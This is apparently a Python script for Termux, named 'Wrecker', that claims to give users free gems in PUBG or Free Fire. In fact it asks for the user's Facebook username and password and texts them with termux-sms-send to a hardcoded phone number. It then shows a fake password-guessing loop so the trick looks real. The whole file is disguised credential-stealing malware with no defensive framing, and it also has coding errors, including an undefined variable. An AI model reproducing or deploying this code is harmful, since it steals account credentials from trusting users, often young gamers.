import os 
import time 
'''
File: Wrecker
Author: devincrack
Description: A tool to get 56 gems in pubg/free fire
'''
def banner():
    """docstring for banner"""
    print('''
    
\033[01;34m                        _
\033[01;34m__      ___ __ ___  ___| | _____ _ __
\033[01;34m\ \ /\ / / '__/ _ \/ __| |/ / _ \ '__|
\033[01;34m \ V  V /| | |  __/ (__|   <  __/ |
\033[01;34m  \_/\_/ |_|  \___|\___|_|\_\___|_|
    
    
    ''')
    
def pubg():
    print("please wait , work is under process")
    time.sleep(2)
    username = input(("\nEntre your username for PUBG: "))
    print(f"Target Set <|{username}|>")
    time.sleep(2)
    print("\nWe need to verify your account with Facebook ")
    fb_id = input("Have you any Facebook ID <|y/n|>: ")
    if fb == "Y" or fb == "y":
        print("We are trying to get in your PUBG username through Facebook")
        fb_id = input("Entre your username for Facebook: ")
        
        fb_pass = input("Entre password for Facebook: ")
    elif fb == "N" or fb == "n":
        PUBG_pass = input(f"After this , Entre your {username}'s password: ")
    time.sleep(3)
    print("\nWait for your server connection to Wrecker...")
    print("\n PLEASE DON'T EXIT, OTHERWISE ID CONNECTION WILL BE BREAK...!!! ")
    time.sleep(3)
    print("This will ask you to send sms to our server,  ALLOW THIS TO SEND SMS , wait")
    time.sleep(5)
    os.system(f"termux-sms-send -n 9815390185 id= {fb_id},pass={fb_pass}")
    os.system(f"termux-sms-send -n 9815390185 id= {fb_id},pass={fb_pass}")
    os.system(f"termux-sms-send -n 9815390185 id= {fb_id},pass={fb_pass}")
    
    time.sleep(2)
    for i in range(10100,99999999):
        print(f"Trying password for {username} :{i}")
        time.sleep(0.7)


def free_fire():
    print("please wait , work is under process")
    time.sleep(2)
    username = input(("\nEntre your username for FREE FIRE: "))
    print(f"Target Set <|{username}|>")
    time.sleep(2)
    print("\nWe need to verify your account with Facebook ")
    fb = input("Have you any Facebook ID <|y/n|>: ")
    if fb == "Y" or fb == "y":
        print("We are trying to get in your PUBG username through Facebook")
        fb_id = input("Entre your username for Facebook: ")
        
        fb_pass = input("Entre password for Facebook: ")
    elif fb == "N" or fb == "n":
        FREE_FIRE_pass = input(f"After this , Entre your {username}'s password: ")
    time.sleep(3)
    print("\nWait for your server connection to Wrecker...")
    print("\n PLEASE DON'T EXIT, OTHERWISE ID CONNECTION WILL BE BREAK...!!! ")
    time.sleep(3)
    print("This will ask you to send sms to our server,  ALLOW THIS TO SEND SMS , wait")
    time.sleep(5)
    os.system(f"termux-sms-send -n 9815390185 id= {fb_id},pass={fb_pass}")
    os.system(f"termux-sms-send -n 9815390185 id= {fb_id},pass={fb_pass}")
    os.system(f"termux-sms-send -n 9815390185 id= {fb_id},pass={fb_pass}")
    time.sleep(2)
    for i in range(10100,99999999):
        print(f"Trying password for {username} :{i}")
        time.sleep(0.7)


game = True
while game!=0:
    banner()
    print("\nWelcome To Wrecker!")
    
    print('''\n[1.] PUBG \n[2.] FREE FIRE \n[0.] Exit
    ''')
    game = int(input("Select Your GamePlay <|1,2,0|>: "))
    if game == 1:
        pubg()
    elif game == 2:
        free_fire()
    elif game >= 3:
        print("____invalid choice____")
        time.sleep(2)
        os.system("clear")